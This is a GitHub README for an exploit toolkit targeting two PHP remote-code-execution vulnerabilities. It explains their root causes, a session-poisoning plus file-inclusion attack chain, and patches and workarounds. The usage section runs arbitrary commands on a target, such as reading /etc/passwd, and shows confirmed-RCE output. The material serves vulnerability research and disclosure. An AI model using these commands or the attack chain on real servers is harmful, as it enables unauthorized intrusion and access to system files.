# php2shell

[![Author](https://img.shields.io/badge/Author-l3tchupkt-blue.svg)](https://github.com/l3tchupkt)
[![Vulnerabilities](https://img.shields.io/badge/CVE-2026--109618%20%7C%20CVE--2026--109619-red.svg)](https://www.php.net/archive/2026.php#2026-10-21-5)
[![Python](https://img.shields.io/badge/Python-3.10%2B-brightgreen.svg)](https://python.org)

Exploit tooling and vulnerability research for **CVE-2026-109618** and **CVE-2026-109619** — two critical unauthenticated remote code execution (RCE) vulnerabilities patched in PHP 8.4.27, 8.3.36, 8.2.35, and 8.5.12 (released October 21, 2026).

Developed and maintained by **[l3tchupkt](https://github.com/l3tchupkt)**.

> **Disclaimer:** This software is provided for educational and authorized penetration testing purposes only. Targeting systems without prior mutual consent is illegal.

---

## Vulnerability Breakdown

| CVE | Title | CVSS v4 | Affected Versions | Patched In |
|-----|-------|---------|-------------------|------------|
| **CVE-2026-109618** | RCE via Out-of-Memory (OOM) Corruption | 9.2 | < 8.2.35, < 8.3.36, < 8.4.27, < 8.5.12 | 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
| **CVE-2026-109619** | RCE via Stale Global State Use-After-Free | 9.2 | < 8.2.35, < 8.3.36, < 8.4.27, < 8.5.12 | 8.2.35, 8.3.36, 8.4.27, 8.5.12 |

### Root Cause Analysis

1. **CVE-2026-109618 (OOM Memory Corruption)**:
   - PHP relies on `longjmp()` for error recovery during out-of-memory (OOM) conditions.
   - During request processing, memory chunks can be linked into reachable tracking structures before all fields are fully initialized.
   - An OOM condition triggered during this timing window interrupts initialization. Later, Zend memory manager deallocation and request shutdown routines assume pointers are valid, leading to memory corruption and potential code execution.

2. **CVE-2026-109619 (Stale Global State UAF)**:
   - Worker processes in persistent environments (such as PHP-FPM) store execution state across requests.
   - Under specific multipart parsing and session-handling conditions, global state pointers referencing request-allocated buffers are not completely reinitialized after an error or request completion.
   - Subsequent requests can reuse or branch on these dangling pointers, resulting in a Use-After-Free (UAF).
   - The PHP official advisory specifically identifies `session.upload_progress` as the primary confirmed vector and recommends `session.upload_progress.enabled=0` as the immediate mitigation.

---

## Repository Structure

```
php2shell/
├── exploit.py        # Weaponized PoC: Session Upload Progress Poisoning + LFI -> RCE
├── uaf_probe.py      # Behavioral crash probe for multipart parser stress testing
├── requirements.txt  # Python package dependencies
└── README.md         # Vulnerability analysis, exploitation mechanics, and usage
```

---

## Exploitation Mechanics

### 1. Weaponized Chain (`exploit.py`)

`exploit.py` demonstrates the confirmed attack surface documented by PHP's security advisory:

1. **Session Poisoning via Upload Progress**:
   - Sends a `multipart/form-data` request containing the `PHP_SESSION_UPLOAD_PROGRESS` field and a custom `PHPSESSID` cookie.
   - Even if `session.auto_start` is disabled, PHP's upload progress feature creates a session file on disk (default: `/var/lib/php/sessions/sess_<PHPSESSID>` or `/tmp/sess_<PHPSESSID>`).
   - The payload containing base64-encoded shell commands wrapped in unique markers is written verbatim into the session file.
2. **Local File Inclusion (LFI) Trigger**:
   - Requests the LFI endpoint including the poisoned session file.
   - PHP parses and executes the embedded PHP code.
3. **Output Extraction**:
   - The script isolates the command output demarcated by `<!--p2s:s-->` and `<!--p2s:e-->` markers, filtering out extraneous session metadata.

### 2. Multipart Behavioral Probe (`uaf_probe.py`)

`uaf_probe.py` evaluates multipart parser behavior under malformed inputs:
- Sends crafted multipart structures: nested boundaries, oversized headers, null-byte injections, truncated boundaries, and interleaved streams.
- Monitors connection resets and HTTP 502/503 responses indicative of PHP worker crashes.

---

## Installation

```bash
# Clone the repository
git clone https://github.com/l3tchupkt/php2shell.git
cd php2shell

# (Optional) Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\Activate.ps1

# Install requirements
pip install -r requirements.txt
```

---

## Usage Guide

### Remote Code Execution (`exploit.py`)

```bash
# Recon and configuration check only
python3 exploit.py -t http://target:8080 --check

# Execute arbitrary shell commands
python3 exploit.py -t http://target:8080 -c "id"
python3 exploit.py -t http://target:8080 -c "uname -a"
python3 exploit.py -t http://target:8080 -c "cat /etc/passwd"

# Custom endpoints or session path
python3 exploit.py -t http://target:8080 \
  --upload-ep /upload.php \
  --lfi-ep /index.php \
  --lfi-param page \
  --session-path /tmp \
  -c "whoami"
```

#### Example Output:

```text
============================================================
  php2shell PoC  -  Session Poisoning + LFI
  CVE-2026-109619  |  v1.0.0  |  Author: l3tchupkt
  GitHub: https://github.com/l3tchupkt
============================================================

[*] Probing target configuration ...
[*] PHP Version:               8.4.x
[*] upload_progress.enabled:   On
[*] upload_progress.cleanup:   Off
[*] session.save_path:         /var/lib/php/sessions
[*] Session dir writable:      YES
[*] LFI endpoint functional:   YES

[*] Running chain (cmd='id') ...

[+] RCE CONFIRMED

------------------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
------------------------------------------------------------
```

### Behavioral Parser Probe (`uaf_probe.py`)

```bash
# Probe upload endpoint with all mutation variants
python3 uaf_probe.py -t http://target:8080/upload.php

# Repeat tests with verbose output
python3 uaf_probe.py -t http://target:8080/upload.php --repeat 3 -v

# Target a specific mutation variant
python3 uaf_probe.py -t http://target:8080/upload.php --variant nested
```

---

## Mitigation & Remediation

1. **Primary Solution**:
   Upgrade PHP to patched releases immediately:
   - **PHP 8.4** → Upgrade to **8.4.27+**
   - **PHP 8.3** → Upgrade to **8.3.36+**
   - **PHP 8.2** → Upgrade to **8.2.35+**
   - **PHP 8.5** → Upgrade to **8.5.12+**

2. **Temporary Workaround (CVE-2026-109619)**:
   Disable upload progress in `php.ini` or FPM pool configuration and restart services:
   ```ini
   session.upload_progress.enabled = Off
   ```

3. **Memory Safeguards (CVE-2026-109618)**:
   - Configure conservative `post_max_size` and `upload_max_filesize` thresholds.
   - Ensure `memory_limit` provides sufficient headroom to prevent reachable OOM abort conditions.

---

## References

- [PHP Official Security Advisory (2026-10-21)](https://www.php.net/archive/2026.php#2026-10-21-5)
- [GitHub Advisory Database: GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [GitHub Advisory Database: GHSA-w8hw-w9fx-j79w (CVE-2026-109618)](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP 8.4 ChangeLog](https://www.php.net/ChangeLog-8.php#8.4.27)
- [Author GitHub Profile](https://github.com/l3tchupkt)
